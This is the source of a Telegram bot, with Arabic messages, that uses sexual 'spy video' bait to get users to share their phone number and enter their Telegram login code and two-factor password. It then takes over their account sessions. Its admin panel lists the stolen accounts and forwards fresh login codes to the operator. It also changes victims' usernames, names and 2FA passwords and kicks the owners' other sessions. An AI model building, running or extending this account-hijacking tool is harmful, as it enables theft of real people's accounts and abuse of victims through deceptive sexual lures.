import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, Contact
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

from config import BOT_TOKEN, ADMIN_IDS, REGISTRATION_LINK
import database
import session_manager
from keyboards import (
    age_confirm_keyboard, share_phone_keyboard, numpad_keyboard,
    retry_keyboard, sessions_keyboard, session_detail_keyboard,
    back_to_session_keyboard, ADMIN_FOOTER
)

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())


class UserFlow(StatesGroup):
    waiting_phone = State()
    entering_code = State()
    entering_2fa  = State()

class AdminFlow(StatesGroup):
    waiting_code  = State()
    changing_user = State()
    changing_name = State()
    changing_2fa  = State()


user_code_input  = {}
user_msg_ids     = {}
user_link_msg_id = {}
phone_to_user    = {}
code_wait_tasks  = {}


def is_admin(uid):
    return uid in ADMIN_IDS

def h(text):
    """Escape HTML special chars"""
    return str(text).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")

async def safe_delete(chat_id, msg_id):
    try:
        await bot.delete_message(chat_id, msg_id)
    except Exception:
        pass

async def notify_admins(text: str):
    for aid in ADMIN_IDS:
        try:
            await bot.send_message(aid, text, parse_mode="HTML")
        except Exception:
            pass

async def edit_or_send(chat_id, uid, text, markup=None):
    mid = user_msg_ids.get(uid)
    if mid:
        try:
            await bot.edit_message_text(text, chat_id=chat_id, message_id=mid,
                                        reply_markup=markup, parse_mode="HTML")
            return
        except Exception:
            pass
    m = await bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
    user_msg_ids[uid] = m.message_id


@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    uid = message.from_user.id

    
    if is_admin(uid):
        await show_admin_panel(message)
        return

    user = await database.get_user(uid)
    if user and user["phone"]:
        phone = user["phone"]
        session = await database.get_session_by_phone(phone)
        if session and session["valid"]:
            m = await message.answer(
                f"✅ أنت مسجل مسبقاً!\n\n🔗 رابط الفيديو🫦🫦:\n{REGISTRATION_LINK}\nكلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين💋🫦\n@N01_n0one"
            )
            user_link_msg_id[uid] = m.message_id
            return

    m = await message.answer(
        "💋 للوصول إلى البوت، يجب عليك تأكيد أن عمرك يزيد عن 18 عامًا!🔞",
        reply_markup=age_confirm_keyboard()
    )
    user_msg_ids[uid] = m.message_id


@dp.callback_query(F.data == "confirm_age")
async def confirm_age(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    if is_admin(uid):
        await callback.answer()
        return

    await callback.message.edit_text("💦 اضغط الزر! ❤️‍🔥\n👇👇 (عمري فوق ١٨ عامًا!) 👇👇")
    user_msg_ids[uid] = callback.message.message_id
    await callback.message.answer("👇", reply_markup=share_phone_keyboard())
    await state.set_state(UserFlow.waiting_phone)
    await callback.answer()


@dp.message(UserFlow.waiting_phone, F.contact)
async def contact_received(message: Message, state: FSMContext):
    uid = message.from_user.id
    contact: Contact = message.contact

    await safe_delete(message.chat.id, message.message_id)
    await safe_delete(message.chat.id, message.message_id - 1)

    phone = contact.phone_number
    if not phone.startswith("+"):
        phone = f"+{phone}"

    uname = message.from_user.username or ""
    fname = f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
    await database.save_user(uid, uname, fname, phone)
    phone_to_user[phone] = uid

    await edit_or_send(message.chat.id, uid, "⏳ انتظر قليلاً 🕐")

    result = await session_manager.request_code(uid, phone)

    if not result["success"]:
        err = result.get("error", "")
        txt = f"⚠️ حاول بعد {err.split(':')[1]} ثانية." if "flood" in err else "❌ حدث خطأ، حاول مرة أخرى لاحقاً."
        await edit_or_send(message.chat.id, uid, txt)
        await state.clear()
        return

    user_code_input[uid] = ""
    await state.set_state(UserFlow.entering_code)
    await state.update_data(phone=phone)

    await edit_or_send(
        message.chat.id, uid,
        "✅ أدخل رمز التأكيد الذي أرسلناه إليك.\n\n"
        'يمكنك الحصول على الرمز من <a href="https://t.me/+42777">هنا</a>',
        markup=numpad_keyboard("")
    )


@dp.message(F.contact)
async def block_contact(message: Message, state: FSMContext):
    await safe_delete(message.chat.id, message.message_id)


@dp.callback_query(F.data.startswith("np_"))
async def numpad_press(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    cur = await state.get_state()
    if cur != UserFlow.entering_code:
        await callback.answer()
        return

    key  = callback.data[3:]
    code = user_code_input.get(uid, "")

    if key == "del":
        code = code[:-1]
    elif key == "display":
        await callback.answer()
        return
    else:
        if len(code) < 5:
            code += key

    user_code_input[uid] = code

    if len(code) == 5:
        await callback.answer("⏳ جاري التحقق...")
        
        await edit_or_send(callback.message.chat.id, uid, "⏳ جاري التحقق...")
        result = await session_manager.submit_code(uid, code)
        user_code_input[uid] = ""

        if result.get("two_fa"):
            await state.set_state(UserFlow.entering_2fa)
            await edit_or_send(callback.message.chat.id, uid,
                               "🔐 أدخل كلمة مرور التحقق بخطوتين وأرسلها:")
            return

        if result["success"]:
            data  = await state.get_data()
            phone = data.get("phone")
            await state.clear()
            
            await edit_or_send(
                callback.message.chat.id, uid,
                f"✅ تم التسجيل بنجاح!\n\n🔗 رابط الفيديو🫦💋:\n{REGISTRATION_LINK}\nكلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين💗💞\n@N01_n0one"
            )
            user_link_msg_id[uid] = user_msg_ids.get(uid)
            await _notify_new_session(phone)
        else:
            await edit_or_send(callback.message.chat.id, uid,
                               "❌ الرمز خاطئ أو منتهي. حاول مرة أخرى.",
                               markup=retry_keyboard())
    else:
        try:
            await bot.edit_message_reply_markup(
                chat_id=callback.message.chat.id,
                message_id=user_msg_ids.get(uid, callback.message.message_id),
                reply_markup=numpad_keyboard(code)
            )
        except Exception:
            pass
        await callback.answer()


@dp.message(UserFlow.entering_2fa)
async def text_2fa(message: Message, state: FSMContext):
    uid = message.from_user.id
    password = message.text.strip()
    await safe_delete(message.chat.id, message.message_id)

    await edit_or_send(message.chat.id, uid, "⏳ جاري التحقق...")
    result = await session_manager.submit_2fa(uid, password)
    if result["success"]:
        data  = await state.get_data()
        phone = data.get("phone")
        await state.clear()
        await edit_or_send(
            message.chat.id, uid,
            f"✅ تم التسجيل بنجاح!\n\n🔗 رابط الفيديو🔞🫦:\n{REGISTRATION_LINK}\nكلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين🔞💞\n@N01_n0one"
        )
        user_link_msg_id[uid] = user_msg_ids.get(uid)
        await _notify_new_session(phone)
    else:
        await edit_or_send(message.chat.id, uid,
                           "❌ كلمة المرور خاطئة. أرسل كلمة مرور التحقق بخطوتين مجدداً:")

async def _notify_new_session(phone: str):
    session = await database.get_session_by_phone(phone)
    if not session:
        return
    uname = session["username"] or "لا يوجد"
    fname = session["full_name"] or "غير معروف"
    await notify_admins(
        f"🆕 <b>حساب جديد تم تسجيله!</b>\n\n"
        f"📱 الرقم: <code>{h(phone)}</code>\n"
        f"👤 الاسم: {h(fname)}\n"
        f"🔖 اليوزر: @{h(uname)}"
        + ADMIN_FOOTER
    )


@dp.callback_query(F.data == "retry_code")
async def retry_code(callback: CallbackQuery, state: FSMContext):
    uid   = callback.from_user.id
    data  = await state.get_data()
    phone = data.get("phone")
    if not phone:
        user = await database.get_user(uid)
        if user:
            phone = user["phone"]
    if not phone:
        await callback.answer("❌ لم يتم العثور على رقمك.")
        return

    result = await session_manager.request_code(uid, phone)
    user_code_input[uid] = ""
    if result["success"]:
        await state.set_state(UserFlow.entering_code)
        await state.update_data(phone=phone)
        await edit_or_send(
            callback.message.chat.id, uid,
            "✅ أدخل رمز التأكيد الذي أرسلناه إليك.\n\n"
            'يمكنك الحصول على الرمز من <a href="https://t.me/+42777">هنا</a>',
            markup=numpad_keyboard("")
        )
    else:
        await callback.answer("❌ فشل إرسال الكود، حاول لاحقاً.")


async def session_watchdog():
    while True:
        await asyncio.sleep(30)
        try:
            sessions = await database.get_all_sessions()
            for s in sessions:
                if not s["valid"]:
                    continue
                phone = s["phone"]
                still_valid = await session_manager.check_session_valid(phone)
                if not still_valid:
                    await notify_admins(
                        f"⚠️ <b>جلسة انتهت أو طُردت!</b>\n\n"
                        f"📱 الرقم: <code>{h(phone)}</code>\n"
                        f"👤 الاسم: {h(s['full_name'] or 'غير معروف')}\n\n"
                        f"❌ تم تحديد الجلسة كغير صالحة."
                        + ADMIN_FOOTER
                    )
                    uid = phone_to_user.get(phone)
                    if uid:
                        lmid = user_link_msg_id.get(uid)
                        if lmid:
                            await safe_delete(uid, lmid)
                            user_link_msg_id.pop(uid, None)
                        try:
                            m = await bot.send_message(
                                uid,
                                "⚠️ انتهت جلستك. يرجى إعادة التسجيل.",
                                reply_markup=retry_keyboard()
                            )
                            user_msg_ids[uid] = m.message_id
                        except Exception:
                            pass
        except Exception as e:
            logging.error(f"Watchdog: {e}")





async def show_admin_panel(message: Message):
    count    = await database.get_sessions_count()
    sessions = await database.get_all_sessions()
    text = (
        f"👋 أهلاً بالقيادة!\n\n"
        f"هذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
        + ADMIN_FOOTER
    )
    if sessions:
        await message.answer(text, reply_markup=sessions_keyboard(sessions), parse_mode="HTML")
    else:
        await message.answer(text + "\n\n📭 لا توجد جلسات محفوظة.", parse_mode="HTML")

@dp.callback_query(F.data.startswith("sessions_page_"))
async def sessions_page(callback: CallbackQuery):
    if not is_admin(callback.from_user.id): await callback.answer(); return
    page     = int(callback.data.split("_")[-1])
    sessions = await database.get_all_sessions()
    count    = await database.get_sessions_count()
    text = (
        f"👋 أهلاً بالقيادة!\n\nهذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
        + ADMIN_FOOTER
    )
    await callback.message.edit_text(text, reply_markup=sessions_keyboard(sessions, page), parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data.startswith("session_"))
async def session_detail(callback: CallbackQuery):
    if not is_admin(callback.from_user.id): await callback.answer(); return
    phone   = callback.data[8:]
    session = await database.get_session_by_phone(phone)
    if not session:
        await callback.answer("❌ الجلسة غير موجودة!")
        return

    username   = session["username"] or "لا يوجد"
    full_name  = session["full_name"] or "غير معروف"
    created_at = session["created_at"]
    two_fa_stat = "✅ موجود" if session["two_fa"] else "❌ لا يوجد"
    valid_stat  = "✅ نشطة"  if session["valid"]  else "❌ غير صالحة"

    text = (
        f"📱 <code>{h(phone)}</code>\n\n"
        f"👤 الاسم: {h(full_name)}\n"
        f"🔖 اليوزر: @{h(username)}\n"
        f"🔐 التحقق بخطوتين: {two_fa_stat}\n"
        f"📶 الحالة: {valid_stat}\n"
        f"📅 تاريخ التسجيل: {h(created_at)}"
        + ADMIN_FOOTER
    )
    await callback.message.edit_text(text, reply_markup=session_detail_keyboard(phone), parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "back_to_sessions")
async def back_to_sessions(callback: CallbackQuery):
    if not is_admin(callback.from_user.id): await callback.answer(); return
    sessions = await database.get_all_sessions()
    count    = await database.get_sessions_count()
    text = (
        f"👋 أهلاً بالقيادة!\n\nهذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
        + ADMIN_FOOTER
    )
    kb = sessions_keyboard(sessions) if sessions else None
    suffix = "" if sessions else "\n\n📭 لا توجد جلسات."
    await callback.message.edit_text(text + suffix, reply_markup=kb, parse_mode="HTML")
    await callback.answer()


@dp.callback_query(F.data.startswith("req_code_"))
async def admin_req_code(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id): await callback.answer(); return

    phone    = callback.data[9:]
    admin_id = callback.from_user.id
    msg_id   = callback.message.message_id
    user_msg_ids[admin_id] = msg_id

    old_task = code_wait_tasks.pop(admin_id, None)
    if old_task:
        old_task.cancel()

    session = await database.get_session_by_phone(phone)
    two_fa_text = ""
    if session and session["two_fa"]:
        two_fa_text = f"\n\n🔐 <b>التحقق بخطوتين:</b> <code>{h(session['two_fa'])}</code>"

    await callback.message.edit_text(
        f"⏳ في انتظار الكود للرقم <code>{h(phone)}</code>\n\n"
        f"اطلب الكود بنفسك، البوت سيرسله لك فور وصوله تلقائياً."
        + two_fa_text + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=back_to_session_keyboard(phone)
    )

    task = asyncio.create_task(
        _watch_and_forward(admin_id, phone, msg_id, two_fa_text)
    )
    code_wait_tasks[admin_id] = task
    await callback.answer()

async def _watch_and_forward(admin_id: int, phone: str, msg_id: int, two_fa_text: str):
    code_msg = await session_manager.watch_for_new_code(phone, timeout=180)
    code_wait_tasks.pop(admin_id, None)

    if code_msg:
        try:
            await bot.edit_message_text(
                f"📲 <b>وصل الكود للرقم</b> <code>{h(phone)}</code>\n\n"
                f"📨 الرسالة:\n<code>{h(code_msg)}</code>"
                + two_fa_text + ADMIN_FOOTER,
                chat_id=admin_id,
                message_id=msg_id,
                parse_mode="HTML",
                reply_markup=back_to_session_keyboard(phone)
            )
        except Exception:
            await bot.send_message(
                admin_id,
                f"📲 <b>وصل الكود للرقم</b> <code>{h(phone)}</code>\n\n"
                f"<code>{h(code_msg)}</code>" + two_fa_text + ADMIN_FOOTER,
                parse_mode="HTML",
                reply_markup=back_to_session_keyboard(phone)
            )
    else:
        try:
            await bot.edit_message_text(
                f"⌛ انتهت مدة الانتظار (3 دقائق) بدون استلام كود للرقم <code>{h(phone)}</code>."
                + ADMIN_FOOTER,
                chat_id=admin_id,
                message_id=msg_id,
                parse_mode="HTML",
                reply_markup=back_to_session_keyboard(phone)
            )
        except Exception:
            pass


@dp.callback_query(F.data.startswith("ch_user_"))
async def admin_change_username(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id): await callback.answer(); return
    phone = callback.data[8:]
    await state.set_state(AdminFlow.changing_user)
    await state.update_data(phone=phone)
    user_msg_ids[callback.from_user.id] = callback.message.message_id
    await callback.message.edit_text(
        f"✏️ أدخل اليوزر الجديد للحساب <code>{h(phone)}</code>:\n(بدون @)"
        + ADMIN_FOOTER,
        parse_mode="HTML", reply_markup=back_to_session_keyboard(phone))
    await callback.answer()

@dp.message(AdminFlow.changing_user)
async def process_username_change(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id): return
    aid = message.from_user.id
    await safe_delete(message.chat.id, message.message_id)
    data  = await state.get_data()
    phone = data.get("phone")
    new_u = message.text.strip().replace("@", "")
    result = await session_manager.change_username(phone, new_u)
    txt = f"✅ تم تغيير اليوزر إلى @{h(new_u)}" if result["success"] else f"❌ فشل: {h(result.get('error',''))}"
    await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(phone))
    await state.clear()


@dp.callback_query(F.data.startswith("ch_name_"))
async def admin_change_name(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id): await callback.answer(); return
    phone = callback.data[8:]
    await state.set_state(AdminFlow.changing_name)
    await state.update_data(phone=phone)
    user_msg_ids[callback.from_user.id] = callback.message.message_id
    await callback.message.edit_text(
        f"📝 أدخل الاسم الجديد للحساب <code>{h(phone)}</code>:" + ADMIN_FOOTER,
        parse_mode="HTML", reply_markup=back_to_session_keyboard(phone))
    await callback.answer()

@dp.message(AdminFlow.changing_name)
async def process_name_change(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id): return
    aid = message.from_user.id
    await safe_delete(message.chat.id, message.message_id)
    data  = await state.get_data()
    phone = data.get("phone")
    parts = message.text.strip().split(" ", 1)
    first = parts[0]
    last  = parts[1] if len(parts) > 1 else ""
    result = await session_manager.change_name(phone, first, last)
    txt = f"✅ تم تغيير الاسم إلى: {h(first)} {h(last)}".strip() if result["success"] else f"❌ فشل: {h(result.get('error',''))}"
    await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(phone))
    await state.clear()


@dp.callback_query(F.data.startswith("ch_2fa_"))
async def admin_change_2fa(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id): await callback.answer(); return
    phone = callback.data[7:]
    user_msg_ids[callback.from_user.id] = callback.message.message_id
    session = await database.get_session_by_phone(phone)
    has_2fa = bool(session and session["two_fa"])
    current = session["two_fa"] if has_2fa else None

    await state.set_state(AdminFlow.changing_2fa)
    await state.update_data(phone=phone, old_2fa=current, has_2fa=has_2fa)

    if has_2fa:
        txt = (
            f"🔐 الحساب <code>{h(phone)}</code> لديه تحقق بخطوتين حالياً.\n\n"
            f"أدخل كلمة المرور <b>الجديدة</b>:\n"
            f"(أو أرسل <code>remove</code> لإزالة التحقق نهائياً)"
        )
    else:
        txt = (
            f"🔐 الحساب <code>{h(phone)}</code> ليس لديه تحقق بخطوتين.\n\n"
            f"أدخل كلمة المرور الجديدة لتفعيل التحقق بخطوتين:"
        )

    await callback.message.edit_text(txt + ADMIN_FOOTER, parse_mode="HTML",
                                     reply_markup=back_to_session_keyboard(phone))
    await callback.answer()

@dp.message(AdminFlow.changing_2fa)
async def process_2fa_change(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id): return
    aid = message.from_user.id
    await safe_delete(message.chat.id, message.message_id)
    data    = await state.get_data()
    phone   = data.get("phone")
    old_2fa = data.get("old_2fa")
    has_2fa = data.get("has_2fa", False)
    new_2fa = message.text.strip()

    await edit_or_send(aid, aid, "⏳ جاري تطبيق التغيير على الحساب..." + ADMIN_FOOTER,
                       markup=back_to_session_keyboard(phone))

    if new_2fa.lower() == "remove":
        if not has_2fa:
            await edit_or_send(aid, aid,
                f"⚠️ الحساب <code>{h(phone)}</code> ليس لديه تحقق بخطوتين أصلاً." + ADMIN_FOOTER,
                markup=back_to_session_keyboard(phone))
        else:
            result = await session_manager.remove_two_fa(phone, old_2fa)
            if result["success"]:
                await edit_or_send(aid, aid,
                    f"✅ تم إزالة التحقق بخطوتين من الحساب <code>{h(phone)}</code> بنجاح!" + ADMIN_FOOTER,
                    markup=back_to_session_keyboard(phone))
            else:
                await edit_or_send(aid, aid,
                    f"❌ فشل الإزالة: <code>{h(result.get('error',''))}</code>" + ADMIN_FOOTER,
                    markup=back_to_session_keyboard(phone))
    else:
        result = await session_manager.set_two_fa(phone, new_2fa, old_2fa if has_2fa else None)
        if result["success"]:
            await edit_or_send(aid, aid,
                f"✅ تم تغيير التحقق بخطوتين للحساب <code>{h(phone)}</code> بنجاح!\n"
                f"🔐 كلمة المرور الجديدة: <code>{h(new_2fa)}</code>" + ADMIN_FOOTER,
                markup=back_to_session_keyboard(phone))
        else:
            await edit_or_send(aid, aid,
                f"❌ فشل التغيير: <code>{h(result.get('error',''))}</code>" + ADMIN_FOOTER,
                markup=back_to_session_keyboard(phone))
    await state.clear()


@dp.callback_query(F.data.startswith("kick_"))
async def admin_kick_sessions(callback: CallbackQuery):
    if not is_admin(callback.from_user.id): await callback.answer(); return
    phone = callback.data[5:]
    await callback.message.edit_text(
        "⏳ جاري طرد الجلسات..." + ADMIN_FOOTER,
        parse_mode="HTML", reply_markup=back_to_session_keyboard(phone))
    result = await session_manager.terminate_other_sessions(phone)
    if result["success"]:
        txt = f"✅ تم طرد جميع الجلسات الأخرى من <code>{h(phone)}</code> بنجاح!"
    else:
        err = result.get("error", "")
        txt = ("⚠️ الجلسة لا تزال جديدة، انتظر قليلاً وحاول مجدداً."
               if "fresh" in err.lower() or "recently" in err.lower()
               else f"❌ فشل الطرد: <code>{h(err)}</code>")
    await callback.message.edit_text(txt + ADMIN_FOOTER, parse_mode="HTML",
                                     reply_markup=back_to_session_keyboard(phone))
    await callback.answer()


async def main():
    await database.init_db()
    asyncio.create_task(session_watchdog())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
